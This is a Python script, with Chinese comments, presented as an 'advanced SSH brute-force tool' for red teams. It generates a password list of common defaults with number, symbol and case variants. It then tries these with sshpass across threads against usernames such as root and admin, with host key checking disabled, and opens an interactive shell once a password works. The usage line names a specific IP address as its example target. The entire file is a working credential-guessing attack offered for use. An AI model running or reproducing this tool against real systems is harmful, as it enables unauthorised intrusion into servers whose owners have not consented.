#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
高级SSH暴力破解工具 - 红队安全专家专用
"""

import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor

class AdvancedSSHBrute:
    def __init__(self, host, port=22):
        self.host = host
        self.port = port
        self.found_credentials = None
        self.attempts = 0
        self.lock = threading.Lock()
        
    def generate_password_list(self):
        """生成更全面的密码列表"""
        base_passwords = [
            "admin123", "admin", "password", "123456", "root", "toor",
            "pass", "1234", "admin123456", "root123", "password123",
            "123456789", "qwerty", "abc123", "admin@123", "root@123",
            "12345", "111111", "000000", "admin123!", "root123!",
            "password!", "admin@123!", "root@123!", "123456!",
            "admin123#", "root123#", "password#", "admin@123#",
            "root@123#", "123456#", "ubuntu", "centos", "debian",
            "fedora", "kali", "parrot", "arch", "gentoo", "alpine",
            "test", "test123", "user", "user123", "guest", "guest123",
            "demo", "demo123", "temp", "temp123", "default", "default123"
        ]
        
        # 添加数字变体
        number_variants = []
        for pwd in base_passwords:
            number_variants.extend([
                f"{pwd}1", f"{pwd}12", f"{pwd}123", f"{pwd}2024", f"{pwd}2025",
                f"1{pwd}", f"12{pwd}", f"123{pwd}", f"2024{pwd}", f"2025{pwd}"
            ])
        
        # 添加特殊字符变体
        special_variants = []
        for pwd in base_passwords:
            special_variants.extend([
                f"{pwd}!", f"{pwd}@", f"{pwd}#", f"{pwd}$", f"{pwd}%",
                f"{pwd}^", f"{pwd}&", f"{pwd}*", f"{pwd}(", f"{pwd})",
                f"{pwd}-", f"{pwd}_", f"{pwd}+", f"{pwd}=", f"{pwd}[",
                f"{pwd}]", f"{pwd}{{", f"{pwd}}", f"{pwd}|", f"{pwd}\\",
                f"{pwd}:", f"{pwd};", f"{pwd}\"", f"{pwd}'", f"{pwd}<",
                f"{pwd}>", f"{pwd},", f"{pwd}.", f"{pwd}?", f"{pwd}/"
            ])
        
        # 添加大小写变体
        case_variants = []
        for pwd in base_passwords:
            case_variants.extend([
                pwd.upper(), pwd.lower(), pwd.capitalize(),
                pwd.swapcase(), pwd.title()
            ])
        
        # 组合所有变体
        all_passwords = list(set(base_passwords + number_variants + special_variants + case_variants))
        
        return all_passwords
    
    def test_credentials(self, username, password):
        """测试凭据"""
        try:
            cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "ConnectTimeout=5",
                "-o", "StrictHostKeyChecking=no",
                "-o", "PreferredAuthentications=password",
                "-o", "PubkeyAuthentication=no",
                f"{username}@{self.host}",
                "echo 'SUCCESS'"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            with self.lock:
                self.attempts += 1
                
            if result.returncode == 0 and "SUCCESS" in result.stdout:
                with self.lock:
                    self.found_credentials = (username, password)
                return True
                
        except Exception as e:
            pass
        
        return False
    
    def brute_force_user(self, username, password_list, max_threads=10):
        """对单个用户进行暴力破解"""
        print(f"🔐 暴力破解用户: {username}")
        print(f"密码数量: {len(password_list)}")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            for password in password_list:
                if self.found_credentials:
                    break
                    
                future = executor.submit(self.test_credentials, username, password)
                futures.append(future)
            
            # 等待结果
            for future in futures:
                if self.found_credentials:
                    break
                future.result()
        
        return self.found_credentials
    
    def run_brute_force(self):
        """运行暴力破解"""
        print("🚀 高级SSH暴力破解工具 - 红队安全专家专用")
        print("=" * 60)
        
        # 生成密码列表
        password_list = self.generate_password_list()
        print(f"📝 生成密码列表: {len(password_list)} 个密码")
        
        # 常见用户名
        usernames = [
            "root", "admin", "administrator", "user", "ubuntu", 
            "centos", "debian", "fedora", "kali", "parrot"
        ]
        
        print(f"👥 目标用户: {usernames}")
        print("=" * 60)
        
        for username in usernames:
            if self.found_credentials:
                break
                
            print(f"\n🎯 攻击用户: {username}")
            result = self.brute_force_user(username, password_list)
            
            if result:
                username, password = result
                print(f"\n✅ 成功获取凭据!")
                print(f"用户名: {username}")
                print(f"密码: {password}")
                print(f"总尝试次数: {self.attempts}")
                
                # 尝试连接
                print(f"\n🚀 建立SSH连接...")
                try:
                    cmd = [
                        "sshpass", "-p", password,
                        "ssh", "-o", "StrictHostKeyChecking=no",
                        f"{username}@{self.host}"
                    ]
                    subprocess.run(cmd)
                except KeyboardInterrupt:
                    print("\n👋 连接已断开")
                
                return result
        
        print(f"\n❌ 暴力破解失败")
        print(f"总尝试次数: {self.attempts}")
        return None

def main():
    if len(sys.argv) < 2:
        print("使用方法: python3 advanced_ssh_brute.py <IP地址> [端口]")
        print("示例: python3 advanced_ssh_brute.py 82.29.71.156 22")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    
    brute_force = AdvancedSSHBrute(host, port)
    brute_force.run_brute_force()

if __name__ == "__main__":
    main()